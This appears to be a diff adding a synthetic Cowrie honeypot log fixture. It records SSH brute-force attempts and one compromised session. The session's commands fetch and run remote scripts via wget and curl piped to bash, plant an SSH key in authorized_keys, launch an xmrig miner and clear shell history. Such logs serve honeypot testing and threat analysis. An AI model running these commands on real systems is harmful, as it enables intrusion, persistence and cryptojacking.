@@ -1,0 +1,30 @@
+{"timestamp": "2026-01-01T12:00:00.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw0"}
+{"timestamp": "2026-01-01T12:00:02.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw1"}
+{"timestamp": "2026-01-01T12:00:04.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw2"}
+{"timestamp": "2026-01-01T12:00:06.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw3"}
+{"timestamp": "2026-01-01T12:00:08.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw4"}
+{"timestamp": "2026-01-01T12:00:10.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw5"}
+{"timestamp": "2026-01-01T12:00:12.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw6"}
+{"timestamp": "2026-01-01T12:00:14.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw7"}
+{"timestamp": "2026-01-01T12:00:16.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw8"}
+{"timestamp": "2026-01-01T12:00:18.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw9"}
+{"timestamp": "2026-01-01T12:00:20.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw10"}
+{"timestamp": "2026-01-01T12:00:22.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.10", "session": "s1", "username": "root", "password": "pw11"}
+{"timestamp": "2026-01-01T12:01:40.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.20", "session": "s2", "username": "admin", "password": "123456"}
+{"timestamp": "2026-01-01T12:02:00.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.20", "session": "s2", "username": "oracle", "password": "123456"}
+{"timestamp": "2026-01-01T12:02:20.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.20", "session": "s2", "username": "pi", "password": "123456"}
+{"timestamp": "2026-01-01T12:02:40.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.20", "session": "s2", "username": "ubuntu", "password": "123456"}
+{"timestamp": "2026-01-01T12:03:00.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.20", "session": "s2", "username": "test", "password": "123456"}
+{"timestamp": "2026-01-01T12:03:20.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.20", "session": "s2", "username": "git", "password": "123456"}
+{"timestamp": "2026-01-01T12:05:00.000000Z", "eventid": "cowrie.login.success", "src_ip": "198.51.100.7", "session": "s3", "username": "root", "password": "root"}
+{"timestamp": "2026-01-01T12:05:05.000000Z", "eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "session": "s3", "input": "uname -a"}
+{"timestamp": "2026-01-01T12:05:08.000000Z", "eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "session": "s3", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-01-01T12:05:11.000000Z", "eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "session": "s3", "input": "cd /tmp; wget http://192.0.2.50/bins.sh -O bins.sh; chmod +x bins.sh"}
+{"timestamp": "2026-01-01T12:05:14.000000Z", "eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "session": "s3", "input": "curl -s http://192.0.2.50/setup.sh | bash"}
+{"timestamp": "2026-01-01T12:05:17.000000Z", "eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "session": "s3", "input": "mkdir -p ~/.ssh && echo 'ssh-rsa AAAA... x' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-01-01T12:05:20.000000Z", "eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "session": "s3", "input": "./xmrig -o stratum+tcp://pool.example:3333"}
+{"timestamp": "2026-01-01T12:05:23.000000Z", "eventid": "cowrie.command.input", "src_ip": "198.51.100.7", "session": "s3", "input": "history -c; unset HISTFILE"}
+{"timestamp": "2026-01-01T12:05:30.000000Z", "eventid": "cowrie.session.file_download", "src_ip": "198.51.100.7", "session": "s3", "url": "http://192.0.2.50/bins.sh", "shasum": "0000000000000000000000000000000000000000000000000000000000000000", "outfile": "var/lib/cowrie/downloads/0000"}
+{"timestamp": "2026-01-01T12:06:40.000000Z", "eventid": "cowrie.session.connect", "src_ip": "203.0.113.99", "session": "s4"}
+{"timestamp": "2026-01-01T12:06:41.000000Z", "eventid": "cowrie.login.failed", "src_ip": "203.0.113.99", "session": "s4", "username": "root", "password": "x"}
+{"timestamp": "2026-01-01T12:06:42.000000Z", "eventid": "cowrie.command.input", "src_ip": "203.0.113.99", "session": "s4", "input": "ls -la"}
